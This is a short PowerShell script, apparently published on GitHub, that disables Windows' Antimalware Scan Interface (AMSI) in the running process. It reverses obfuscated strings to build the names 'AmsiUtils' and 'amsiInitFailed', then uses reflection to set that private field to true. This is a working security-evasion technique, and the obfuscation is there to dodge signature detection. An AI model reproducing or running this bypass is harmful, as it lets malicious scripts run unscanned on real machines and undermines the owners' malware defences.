########################################################
#
# A script that patches AMSI for the running process 
# Author: Yanal Abuseini
# https://github.com/yanalabuseini/EvadeAMSI
#
########################################################

function EvadeAmsi{
	$tvktrs = 'slitUismA'
	$rftg = 'deliaFtinIisma'
	$rdblk = ([regex]::Matches($tvktrs,'.','RightToLeft') | ForEach {$_.value}) -join ''
	$xvtg = ([regex]::Matches($rftg,'.','RightToLeft') | ForEach {$_.value}) -join ''
	[Ref].Assembly.GetType('System.Management.Automation.' + $rdblk).GetField($xvtg,'NonPublic,Static').SetValue($null,$true)
}
